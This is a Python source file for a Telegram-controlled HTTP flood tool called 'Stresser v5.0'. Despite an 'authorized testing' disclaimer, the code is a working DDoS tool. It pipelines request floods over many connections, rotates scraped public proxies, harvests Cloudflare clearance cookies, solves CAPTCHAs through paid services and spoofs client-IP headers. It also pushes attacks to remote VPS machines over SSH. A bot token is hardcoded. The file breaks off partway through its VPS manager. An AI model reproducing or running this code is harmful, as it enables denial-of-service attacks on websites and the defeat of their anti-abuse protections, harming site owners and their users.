#!/usr/bin/env python3
"""
Stresser v5.0 - Telegram-controlled HTTP stress-testing tool for authorized pentesting.
Features: Multi-target attack, VPS auto-deploy, proxy scrape+check, Cloudflare bypass v2,
           CAPTCHA solver integration, HTTP/2, SOCKS5 proxy grid.

Usage:
  python3 stresser.py http://target.com -d 30 -c 2000
  python3 stresser.py --telegram              # Start Telegram bot control
  python3 stresser.py http://target.com --proxy-list proxies.txt --rand-ua

Bot commands:
  /start           - Show help
  /attack <url>    - Start attack (optional: -d 60 -c 500)
  /attack multi    - Multi-target attack
  /stop            - Stop current attack
  /status          - Show running attack status
  /settings        - View/change runtime settings
  /addvps <ip> <user> <pass> - Register VPS
  /vpslist         - List registered VPS
  /vpsstatus       - Check VPS connectivity
  /deploy <url>    - Deploy attack to all VPS (scp direct)
  /scrape          - Scrape fresh proxies
  /proxies         - Show proxy status
  /checkproxy      - Validate saved proxies
  /methods         - Show all attack methods
  /speedtest       - Benchmark VPS power
  /scan <host>     - Port scan
  /dns <domain>    - DNS lookup
  /geoip <ip>      - IP geolocation

DISCLAIMER: For authorized security testing only.
"""
import asyncio
import argparse
import sys
import time
import random
import socket
import ssl as sslmod
import re
import os
import json
import signal
from typing import Dict, List, Tuple, Optional
from urllib.parse import urlparse

# Set spawn start method for multiprocessing
import multiprocessing as mp
try:
    mp.set_start_method('spawn', force=True)
except RuntimeError:
    pass

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
BOT_TOKEN = "8684782173:AAFEEgtpjXJYxXDL1zgfA-lkODLwpN_Ghyo"
ALLOWED_CHAT_IDS = [8751865150]
VPS_FILE = "/tmp/vps_list.json"
PROXY_FILE = "/tmp/working_proxies.txt"
SOCKS_PROXY_FILE = "/tmp/socks_proxies.txt"
PROXY_SCRAPE_URLS = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
    "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://spys.me/proxy.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 Safari/605.1.15",
]

# CAPTCHA solving config
CAPSOLVER_API_KEY = os.environ.get("CAPSOLVER_KEY", "")
TCAPTCHA_API_KEY = os.environ.get("TCAPTCHA_KEY", "")
CAPTCHA_SERVICE_URL = "https://api.capsolver.com/createTask"
CAPTCHA_SERVICE_GET = "https://api.capsolver.com/getTaskResult"

# CF clearance cookie cache
CF_CLEARANCE_CACHE: dict = {}
CF_CLEARANCE_CACHE_TTL = 300  # seconds before re-harvest

# Browser-emulating header templates (Cloudflare bypass v2)
BROWSER_HEADERS = {
    "chrome": [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Upgrade-Insecure-Requests: 1",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "Sec-Fetch-User: ?1",
        "Sec-CH-UA: \"Google Chrome\";v=\"121\", \"Not?A_Brand\";v=\"8\"",
        "Sec-CH-UA-Mobile: ?0",
        "Sec-CH-UA-Platform: \"Windows\"",
        "DNT: 1",
        "Connection: keep-alive",
        "Cache-Control: max-age=0",
    ],
    "firefox": [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
        "Accept-Encoding: gzip, deflate, br",
        "Upgrade-Insecure-Requests: 1",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "Sec-Fetch-User: ?1",
        "DNT: 1",
        "Connection: keep-alive",
        "Cache-Control: max-age=0",
    ],
    "safari": [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "CF-Cache-Status: DYNAMIC",
        "Connection: keep-alive",
    ],
}

# Common paths for Referer header randomization
REFERER_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact", "/products",
    "/services", "/blog", "/login", "/register", "/api/v1/status",
    "/wp-admin", "/wp-content", "/assets/js/main.js", "/css/style.css",
    "/favicon.ico", "/robots.txt", "/sitemap.xml",
]

# Cloudflare challenge page detection patterns
CHALLENGE_PATTERNS = [
    b"cf-browser-verification",
    b"__cf_challenge",
    b"cf_challenge",
    b"jschl_vc",
    b"pass",
    b"challenge-platform",
    b"turnstile",
    b"cf-error-details",
]

# CAPTCHA detection patterns
CAPTCHA_PATTERNS = [
    b"recaptcha",
    b"hcaptcha",
    b"g-recaptcha",
    b"recaptcha/api",
    b"hcaptcha.com",
    b"captcha",
    b"cf-turnstile",
    b"cf-chl-bypass",
    b"data-sitekey",
]

# ===================================================================
# v5.1: CF UAM Cookie Harvester - Multi-method bypass engine
# ===================================================================
# Set FLARESOLVER_URL env var for managed challenge support
# ex: export FLARESOLVER_URL=http://127.0.0.1:8191/v1
FLARESOLVER_URL = os.environ.get("FLARESOLVER_URL", "")

async def _harvest_cloudscraper(url: str, proxy: str = None) -> Optional[str]:
    """Method 1: cloudscraper - handles simple + Turnstile with API key."""
    try:
        import cloudscraper
        captcha_cfg = {}
        if CAPSOLVER_API_KEY:
            captcha_cfg = {'provider': 'capsolver', 'api_key': CAPSOLVER_API_KEY}
        elif TCAPTCHA_API_KEY:
            captcha_cfg = {'provider': '2captcha', 'api_key': TCAPTCHA_API_KEY}
        if captcha_cfg:
            scraper = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
                captcha=captcha_cfg,
                delay=15,
            )
        else:
            scraper = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
                delay=15,
            )
        proxies = None
        if proxy:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        resp = scraper.get(url, timeout=30, proxies=proxies, allow_redirects=True)
        domain = urlparse(url).hostname or ''
        for c in scraper.cookies:
            if 'cf_clearance' in c.name.lower():
                CF_CLEARANCE_CACHE[domain] = {'cookie': f'cf_clearance={c.value}', 'time': time.time()}
                return f'cf_clearance={c.value}'
        set_cookie = resp.headers.get('Set-Cookie', '')
        if 'cf_clearance' in set_cookie:
            m = re.search(r'cf_clearance=([^;]+)', set_cookie)
            if m:
                CF_CLEARANCE_CACHE[domain] = {'cookie': f'cf_clearance={m.group(1)}', 'time': time.time()}
                return f'cf_clearance={m.group(1)}'
    except Exception:
        pass
    return None

async def _harvest_httpx(url: str, proxy: str = None) -> Optional[str]:
    """Method 2: httpx HTTP/2 fallback."""
    try:
        import httpx
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1',
            'Cache-Control': 'no-cache',
        }
        client_kw = {'http2': True, 'headers': headers, 'timeout': httpx.Timeout(30.0), 'follow_redirects': True}
        if proxy:
            client_kw['proxies'] = {'http://': f'http://{proxy}', 'https://': f'http://{proxy}'}
        async with httpx.AsyncClient(**client_kw) as client:
            resp = await client.get(url)
            domain = urlparse(url).hostname or ''
            for cookie in resp.cookies:
                if 'cf_clearance' in cookie.name.lower():
                    CF_CLEARANCE_CACHE[domain] = {'cookie': f'cf_clearance={cookie.value}', 'time': time.time()}
                    return f'cf_clearance={cookie.value}'
            set_cookie = resp.headers.get('set-cookie', '')
            if 'cf_clearance' in set_cookie:
                m = re.search(r'cf_clearance=([^;]+)', set_cookie)
                if m:
                    CF_CLEARANCE_CACHE[domain] = {'cookie': f'cf_clearance={m.group(1)}', 'time': time.time()}
                    return f'cf_clearance={m.group(1)}'
    except Exception:
        pass
    return None

async def _harvest_flaresolverr(url: str) -> Optional[str]:
    """Method 3: Flaresolverr - for managed/Turnstile challenges."""
    if not FLARESOLVER_URL:
        return None
    try:
        import aiohttp
        payload = {"cmd": "request.get", "url": url, "maxTimeout": 30000}
        async with aiohttp.ClientSession() as sess:
            async with sess.post(FLARESOLVER_URL, json=payload, timeout=35) as resp:
                result = await resp.json()
                solution = result.get('solution', {})
                for c in solution.get('cookies', []):
                    if 'cf_clearance' in c.get('name', '').lower():
                        domain = urlparse(url).hostname or ''
                        CF_CLEARANCE_CACHE[domain] = {'cookie': f'cf_clearance={c["value"]}', 'time': time.time()}
                        return f'cf_clearance={c["value"]}'
                for h, v in solution.get('headers', {}).items():
                    if 'set-cookie' in h.lower() and 'cf_clearance' in v:
                        m = re.search(r'cf_clearance=([^;]+)', v)
                        if m:
                            domain = urlparse(url).hostname or ''
                            CF_CLEARANCE_CACHE[domain] = {'cookie': f'cf_clearance={m.group(1)}', 'time': time.time()}
                            return f'cf_clearance={m.group(1)}'
    except Exception:
        pass
    return None

async def harvest_cf_clearance(url: str, proxy: str = None) -> Optional[str]:
    """Multi-method CF clearance harvester: cloudscraper > httpx > flaresolverr."""
    result = await _harvest_cloudscraper(url, proxy)
    if result:
        return result
    result = await _harvest_httpx(url, proxy)
    if result:
        return result
    result = await _harvest_flaresolverr(url)
    return result

async def get_cf_cookie(url: str, force: bool = False) -> Optional[str]:
    """Get cached or fresh CF clearance cookie."""
    domain = urlparse(url).hostname or ''
    if not force and domain in CF_CLEARANCE_CACHE:
        entry = CF_CLEARANCE_CACHE[domain]
        if time.time() - entry['time'] < CF_CLEARANCE_CACHE_TTL:
            return entry['cookie']
    return await harvest_cf_clearance(url)

# ===================================================================
# v5.0: CAPTCHA Solver via capsolver/2captcha API
# ===================================================================
async def solve_captcha(page_url: str, site_key: str, proxy: str = None) -> Optional[str]:
    """Solve reCAPTCHA/hCaptcha using capsolver or 2captcha API."""
    api_key = CAPSOLVER_API_KEY or TCAPTCHA_API_KEY
    if not api_key:
        return None
    import aiohttp
    task_type = "ReCaptchaV2Task"
    if site_key and len(site_key) > 40:
        task_type = "HCaptchaTask"
    task_payload = {"type": task_type, "websiteURL": page_url, "websiteKey": site_key}
    if proxy:
        task_payload["proxy"] = proxy
    payload = {"clientKey": api_key, "task": task_payload}
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.post(CAPTCHA_SERVICE_URL, json=payload, timeout=30) as resp:
                result = await resp.json()
                task_id = result.get('taskId')
                if not task_id:
                    return None
            for _ in range(30):
                await asyncio.sleep(2)
                async with sess.post(CAPTCHA_SERVICE_GET, json={"clientKey": api_key, "taskId": task_id}, timeout=15) as r2:
                    status = await r2.json()
                    if status.get('status') == 'ready':
                        return status.get('solution', {}).get('gRecaptchaResponse')
    except Exception:
        pass
    return None

async def extract_sitekey(body: bytes) -> Optional[str]:
    """Extract reCAPTCHA/hCaptcha sitekey from page body."""
    m = re.search(rb'data-sitekey=["\']([^"\']+)["\']', body)
    if m:
        return m.group(1).decode()
    m = re.search(rb'sitekey=["\']([^"\']+)["\']', body)
    if m:
        return m.group(1).decode()
    m = re.search(rb'k=["\']([^"\']+)["\']', body)
    if m:
        return m.group(1).decode()
    return None

# ===================================================================
# Proxy scraper
# ===================================================================
async def scrape_proxies(timeout: int = 10) -> List[str]:
    import aiohttp
    proxies: List[str] = []
    seen: set = set()
    async def fetch_one(client: aiohttp.ClientSession, url: str) -> None:
        try:
            async with client.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                if resp.status != 200:
                    return
                text = await resp.text()
                for line in text.strip().split("\n"):
                    line = line.strip()
                    m = re.match(r"(\d+\.\d+\.\d+\.\d+):(\d+)", line)
                    if m:
                        entry = f"{m.group(1)}:{m.group(2)}"
                        if entry not in seen:
                            seen.add(entry)
                            proxies.append(entry)
        except Exception:
            pass
    connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)
    async with aiohttp.ClientSession(connector=connector) as client:
        tasks = [fetch_one(client, url) for url in PROXY_SCRAPE_URLS]
        await asyncio.gather(*tasks, return_exceptions=True)
    return proxies

def load_proxy_file(path: str) -> List[str]:
    proxies = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and re.match(r"\d+\.\d+\.\d+\.\d+:\d+", line):
                proxies.append(line)
    print(f"  [+] Loaded {len(proxies)} proxies from {path}")
    return proxies

# ===================================================================
# Request builder - v5.0 enhanced with POST/HEAD flood methods
# ===================================================================
METHOD_TEMPLATES = {
    "get": "GET {path} HTTP/1.1",
    "post": "POST {path} HTTP/1.1",
    "head": "HEAD {path} HTTP/1.1",
    "put": "PUT {path} HTTP/1.1",
    "options": "OPTIONS {path} HTTP/1.1",
    "delete": "DELETE {path} HTTP/1.1",
    "trace": "TRACE {path} HTTP/1.1",
    "connect": "CONNECT {host}:{port} HTTP/1.1",
}

POST_BODIES = [
    "a=b&c=d",
    "user=admin&pass=test",
    "data=" + "x" * random.randint(100, 500),
    "{" + '"key":"value"' + "}",
]

def build_request(host: str, host_header: str, path: str, method: str = "GET",
                  cf_bypass: bool = False, rand_ua: bool = False,
                  cf_cookie: Optional[str] = None) -> bytes:
    """Build a single HTTP request with browser-emulating headers."""
    browser = random.choice(["chrome", "firefox", "safari"]) if (rand_ua or cf_bypass) else "chrome"
    ua = random.choice(USER_AGENTS) if rand_ua else USER_AGENTS[0]
    
    # Method line
    method_tpl = METHOD_TEMPLATES.get(method.lower(), METHOD_TEMPLATES["get"])
    if method.lower() == "connect":
        method_line = method_tpl.format(host=host, port=host_header.split(":")[1] if ":" in host_header else "443")
    else:
        method_line = method_tpl.format(path=path)
    
    headers = [
        method_line,
        f"Host: {host_header}",
        f"User-Agent: {ua}",
    ]
    
    if cf_bypass:
        headers += BROWSER_HEADERS.get(browser, BROWSER_HEADERS["chrome"])
        # Add CF bypass spoofing headers
        fip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers.extend([
            f"X-Forwarded-For: {fip}",
            f"X-Real-IP: {fip}",
            f"CF-Connecting-IP: {fip}",
            f"X-Originating-IP: {fip}",
            f"Client-IP: {fip}",
            f"CF-IPCountry: {random.choice(['US','GB','DE','FR','CA','AU','JP','BR'])}",
            f"Referer: https://{host_header.split(':')[0]}{random.choice(REFERER_PATHS)}",
        ])
    else:
        headers += [
            "Accept: text/html,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.9",
            "Connection: keep-alive",
        ]
    
    # Inject CF clearance cookie if available
    if cf_cookie:
        headers.append(f"Cookie: {cf_cookie}")
    
    # Add body for POST
    body = b""
    if method.lower() == "post":
        body_data = random.choice(POST_BODIES)
        headers.append(f"Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {len(body_data)}")
        body = body_data.encode()
    
    headers.append("")  # empty line before body
    raw = "\r\n".join(headers).encode() + b"\r\n" + body
    return raw

# ===================================================================
# Stats
# ===================================================================
class StressStats:
    __slots__ = ("completed", "failed", "bytes_recv", "lat_total",
                 "lat_min", "lat_max", "status_codes", "errors",
                 "cf_blocked", "captcha_blocked")
    def __init__(self):
        self.completed = 0
        self.failed = 0
        self.bytes_recv = 0
        self.lat_total = 0.0
        self.lat_min = float('inf')
        self.lat_max = 0.0
        self.status_codes: Dict[int, int] = {}
        self.errors: Dict[str, int] = {}
        self.cf_blocked = 0
        self.captcha_blocked = 0

# ===================================================================
# Async HTTP response reader with pipelining support
# ===================================================================
class HttpResponseReader:
    """Buffered HTTP response reader that handles pipelining."""
    def __init__(self):
        self.buf = b""

    async def read_response(self, reader, timeout):
        """Read one HTTP response, preserving leftover data for next call."""
        while b"\r\n\r\n" not in self.buf:
            chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
            if not chunk:
                return (0, 0, "EOF before headers")
            self.buf += chunk
        header_end = self.buf.index(b"\r\n\r\n") + 4
        headers_raw = self.buf[:header_end]
        self.buf = self.buf[header_end:]

        status = 0
        if headers_raw.startswith(b"HTTP/"):
            try:
                parts = headers_raw.split(b" ", 2)
                status = int(parts[1])
            except (ValueError, IndexError):
                pass

        content_len = -1
        is_chunked = False
        for hdr in headers_raw.split(b"\r\n"):
            hl = hdr.lower()
            if hl.startswith(b"content-length:"):
                try:
                    content_len = int(hdr.split(b":")[1].strip())
                except (ValueError, IndexError):
                    pass
            elif hl.startswith(b"transfer-encoding:"):
                if b"chunked" in hl:
                    is_chunked = True

        body = b""
        try:
            if content_len >= 0:
                needed = content_len - len(self.buf)
                if needed > 0:
                    while len(self.buf) < content_len:
                        chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
                        if not chunk:
                            break
                        self.buf += chunk
                if len(self.buf) >= content_len:
                    body = self.buf[:content_len]
                    self.buf = self.buf[content_len:]
                else:
                    body = self.buf
                    self.buf = b""
            elif is_chunked:
                term = b"0\r\n\r\n"
                while term not in self.buf:
                    chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
                    if not chunk:
                        break
                    self.buf += chunk
                idx = self.buf.find(term) + len(term)
                body = self.buf[:idx]
                self.buf = self.buf[idx:]
        except asyncio.TimeoutError:
            pass

        return (status, len(body), None)

# ===================================================================
# Connection worker - v5.0 enhanced with CF cookie injection, method support
# ===================================================================
async def connection_worker(
    cid: int, host: str, port: int, path: str,
    deadline: float, timeout: float,
    cf_bypass: bool, rand_ua: bool, is_https: bool,
    proxy_list: List[str], stats: StressStats,
    method: str = "GET", cf_cookie: Optional[str] = None,
) -> None:
    ssl_ctx = None
    if is_https:
        ssl_ctx = sslmod.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = sslmod.CERT_NONE
    PIPELINE = 25 if cf_bypass else 10
    MERGE_EVERY = 5000
    consecutive_fails = 0
    cf_blocked_count = 0
    actual_pipeline = PIPELINE
    ok = fail = recv = 0
    lat_total = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    sc: Dict[int, int] = {}
    errs: Dict[str, int] = {}
    current_proxy: Optional[str] = None
    resp_reader = HttpResponseReader()

    def merge():
        nonlocal ok, fail, recv, lat_total, lat_min, lat_max, sc, errs
        stats.completed += ok
        stats.failed += fail
        stats.bytes_recv += recv
        stats.lat_total += lat_total
        if lat_min < stats.lat_min:
            stats.lat_min = lat_min
        if lat_max > stats.lat_max:
            stats.lat_max = lat_max
        for code, cnt in sc.items():
            stats.status_codes[code] = stats.status_codes.get(code, 0) + cnt
        for e, cnt in errs.items():
            stats.errors[e] = stats.errors.get(e, 0) + cnt
        ok = fail = recv = 0
        lat_total = 0.0
        lat_min = float('inf')
        lat_max = 0.0
        sc = {}
        errs = {}

    def pick_proxy_roundrobin():
        nonlocal current_proxy
        if not proxy_list:
            current_proxy = None
            return
        current_proxy = random.choice(proxy_list)

    target_host, target_port = host, port
    use_ssl = is_https
    resolved_ip = None

    if proxy_list:
        pick_proxy_roundrobin()
        if current_proxy:
            parts = current_proxy.split(":")
            target_host = parts[0]
            target_port = int(parts[1])
            use_ssl = False
            resolved_ip = None
    else:
        try:
            if host and not host[0].isdigit():
                resolved_ip = socket.gethostbyname(host)
        except Exception:
            pass

    host_header = host if (port == 80 or port == 443) else f"{host}:{port}"
    connect_host = resolved_ip if resolved_ip else target_host

    # Build a single request
    def make_request():
        return build_request(host, host_header, path, method=method,
                             cf_bypass=cf_bypass, rand_ua=rand_ua,
                             cf_cookie=cf_cookie)

    connect_timeout = max(1.0, min(timeout, 5.0))
    writer = None
    reader = None

    try:
        while time.time() < deadline:
            # Proxy rotation every 100 OK
            if proxy_list and ok > 0 and ok % 100 == 0:
                pick_proxy_roundrobin()
                if current_proxy:
                    target_host, target_port = current_proxy.split(":")
                    target_port = int(target_port)
                    use_ssl = False
                    connect_host = target_host
                if writer:
                    try:
                        writer.close(); await writer.wait_closed()
                    except: pass
                    writer = None; reader = None

            if writer is None:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(
                            connect_host, target_port,
                            ssl=ssl_ctx if use_ssl else None,
                            server_hostname=host if use_ssl else None,
                        ),
                        timeout=connect_timeout,
                    )
                    resp_reader = HttpResponseReader()
                except Exception as e:
                    errs[f"connect:{type(e).__name__}"] = errs.get(f"connect:{type(e).__name__}", 0) + 1
                    fail += 1
                    if proxy_list:
                        pick_proxy_roundrobin()
                        if current_proxy:
                            target_host, target_port = current_proxy.split(":")
                            target_port = int(target_port)
                            use_ssl = False
                            connect_host = target_host
                    await asyncio.sleep(0.001)
                    if ok + fail >= MERGE_EVERY:
                        merge()
                    continue

            # Build pipeline request
            t0 = time.time()
            single_req = make_request()
            pipeline_reqs = single_req * actual_pipeline

            try:
                writer.write(pipeline_reqs)
                await writer.drain()

                for _ in range(actual_pipeline):
                    status, body_len, err = await resp_reader.read_response(reader, timeout)
                    if err:
                        raise ConnectionResetError(err)

                    # Detect CF challenge by status code
                    if status in (403, 503, 429):
                        cf_blocked_count += 1
                        consecutive_fails += 1
                        stats.cf_blocked += 1
                        if proxy_list:
                            pick_proxy_roundrobin()
                            if current_proxy:
                                target_host, target_port = current_proxy.split(":")
                                target_port = int(target_port)
                                use_ssl = False
                                connect_host = target_host
                        sc[status] = sc.get(status, 0) + 1
                        ok += 1
                        recv += body_len
                        raise ConnectionResetError("CF_CHALLENGE")

                    lat = time.time() - t0
                    ok += 1
                    recv += body_len
                    lat_total += lat
                    if lat < lat_min: lat_min = lat
                    if lat > lat_max: lat_max = lat
                    sc[status] = sc.get(status, 0) + 1
                    consecutive_fails = 0
                    if ok + fail >= MERGE_EVERY:
                        merge()

                continue  # Re-use connection

            except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError) as e:
                errs[type(e).__name__] = errs.get(type(e).__name__, 0) + 1
                fail += 1
                consecutive_fails += 1
                if consecutive_fails >= 3 and actual_pipeline > 1:
                    actual_pipeline = max(1, actual_pipeline // 2)
                    consecutive_fails = 0
                try:
                    writer.close(); await writer.wait_closed()
                except: pass
                writer = None; reader = None
            except asyncio.TimeoutError:
                errs['TimeoutError'] = errs.get('TimeoutError', 0) + 1
                fail += 1
                consecutive_fails += 1
                if consecutive_fails >= 3 and actual_pipeline > 1:
                    actual_pipeline = max(1, actual_pipeline // 2)
                    consecutive_fails = 0
                try:
                    writer.close(); await writer.wait_closed()
                except: pass
                writer = None; reader = None
            except Exception as e:
                en = type(e).__name__
                if en not in ('CF_CHALLENGE', 'CAPTCHA'):
                    errs[en] = errs.get(en, 0) + 1
                    fail += 1
                consecutive_fails += 1
                try:
                    writer.close(); await writer.wait_closed()
                except: pass
                writer = None; reader = None

    except asyncio.CancelledError:
        pass
    finally:
        if writer is not None:
            try:
                writer.close(); await writer.wait_closed()
            except: pass
        merge()

# ===================================================================
# HTTP/2 connection worker (uses httpx for proper HTTP/2 support)
# ===================================================================
async def connection_worker_http2(
    cid: int, url: str, deadline: float, timeout: float,
    cf_bypass: bool, rand_ua: bool,
    stats: StressStats, method: str = "GET",
    cf_cookie: Optional[str] = None,
) -> None:
    import httpx
    limits = httpx.Limits(max_keepalive_connections=1, max_connections=200)
    headers = {
        'Accept': 'text/html,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    if cf_cookie:
        headers['Cookie'] = cf_cookie
    ok = fail = recv = 0
    lat_total = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    sc: Dict[int, int] = {}
    errs: Dict[str, int] = {}
    MERGE_EVERY = 200

    def merge():
        nonlocal ok, fail, recv, lat_total, lat_min, lat_max, sc, errs
        stats.completed += ok
        stats.failed += fail
        stats.bytes_recv += recv
        stats.lat_total += lat_total
        if lat_min < stats.lat_min:
            stats.lat_min = lat_min
        if lat_max > stats.lat_max:
            stats.lat_max = lat_max
        for code, cnt in sc.items():
            stats.status_codes[code] = stats.status_codes.get(code, 0) + cnt
        for e, cnt in errs.items():
            stats.errors[e] = stats.errors.get(e, 0) + cnt
        ok = fail = recv = 0
        lat_total = 0.0
        lat_min = float('inf')
        lat_max = 0.0
        sc = {}
        errs = {}

    client = httpx.AsyncClient(http2=True, limits=limits, headers=headers, timeout=httpx.Timeout(timeout))
    try:
        while time.time() < deadline:
            t0 = time.time()
            try:
                if method.upper() == "POST":
                    r = await client.post(url, data=random.choice(POST_BODIES))
                elif method.upper() == "HEAD":
                    r = await client.head(url)
                elif method.upper() == "PUT":
                    r = await client.put(url, data="x" * 256)
                else:
                    r = await client.get(url)
                lat = time.time() - t0
                sc[r.status_code] = sc.get(r.status_code, 0) + 1
                ok += 1
                recv += len(r.content)
                lat_total += lat
                if lat < lat_min:
                    lat_min = lat
                if lat > lat_max:
                    lat_max = lat
            except Exception as e:
                ename = type(e).__name__
                errs[ename] = errs.get(ename, 0) + 1
                fail += 1
            if ok + fail >= MERGE_EVERY:
                merge()
    except asyncio.CancelledError:
        pass
    finally:
        await client.aclose()
        merge()

# ===================================================================
# Main stress function - v5.0 with method + cf_cookie support
# ===================================================================
async def stress(url: str, duration: int, connections: int, timeout: float,
                 cf_bypass: bool, rand_ua: bool, proxy_list: List[str],
                 http2: bool = False, progress_cb=None,
                 method: str = "GET", cf_cookie: Optional[str] = None) -> dict:
    """Run stress test and return results dict."""
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    is_https = parsed.scheme == "https"
    deadline = time.time() + duration

    stats = StressStats()
    start = time.time()

    if http2:
        workers = [
            connection_worker_http2(i, url, deadline, timeout,
                                    cf_bypass, rand_ua, stats,
                                    method=method, cf_cookie=cf_cookie)
            for i in range(connections)
        ]
    else:
        workers = [
            connection_worker(i, host, port, path, deadline, timeout,
                              cf_bypass, rand_ua, is_https, proxy_list, stats,
                              method=method, cf_cookie=cf_cookie)
            for i in range(connections)
        ]
    tasks = [asyncio.create_task(w) for w in workers]

    last_print = 0.0
    try:
        while time.time() < deadline:
            now = time.time()
            if now - last_print >= 0.5:
                total = stats.completed + stats.failed
                e = now - start
                rps = total / e if e > 0 else 0
                if progress_cb:
                    progress_cb(stats.completed, stats.failed, rps)
                last_print = now
            await asyncio.sleep(0.1)
        # Cancel remaining workers
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - start
    total = stats.completed + stats.failed
    return {
        'ok': stats.completed, 'fail': stats.failed, 'total': total,
        'rps': total / elapsed if elapsed > 0 else 0,
        'elapsed': elapsed, 'sc': dict(stats.status_codes),
        'errors': dict(stats.errors), 'bytes': stats.bytes_recv,
        'cf_blocked': stats.cf_blocked,
    }

# ===================================================================
# VPS Manager - v5.0 with SCP deploy + better error reporting
# ===================================================================
class VPSManager:
    """Manages VPS instances via SSH: add, deploy, check status."""

    def __init__(self, vps_file: str = VPS_FILE):
        self.vps_file = vps_file
        self.servers: List[dict] = []
        self._load()

    def _load(self):
        try:
            if os.path.exists(self.vps_file):
                with open(self.vps_file) as f:
                    data = json.load(f)
                    self.servers = data if isinstance(data, list) else []
        except Exception:
            self.servers = []

    def _save(self):
        try:
            with open(self.vps_file, 'w') as f:
                json.dump(self.servers, f, indent=2)
        except Exception:
            pass

    def add(self, ip: str, username: str, password: str, label: str = "", port: int = 22) -> bool:
        for s in self.servers:
            if s['ip'] == ip:
                s['username'] = username
                s['password'] = password
                s['label'] = label or ip
                s['port'] = port
                self._save()
                return True
        self.servers.append({
            'ip': ip, 'port': port, 'username': username,
            'password': password, 'label': label or ip,
            'added': time.time(),
        })
        self._save()
        return True

    def remove(self, ip: str) -> bool:
        self.servers = [s for s in self.servers if s['ip'] != ip]
        self._save()
        return True

    def list(self) -> List[dict]:
        return list(self.servers)

    async def check_one(self, server: dict) -> dict:
        """SSH into a VPS and check if it's reachable."""
        try:
            import asyncssh
            ssh_port = int(server.get('port', 22))
            async with asyncssh.connect(
                server['ip'], port=ssh_port,
                username=server['username'], password=server['password'],
                known_hosts=None, connect_timeout=10,
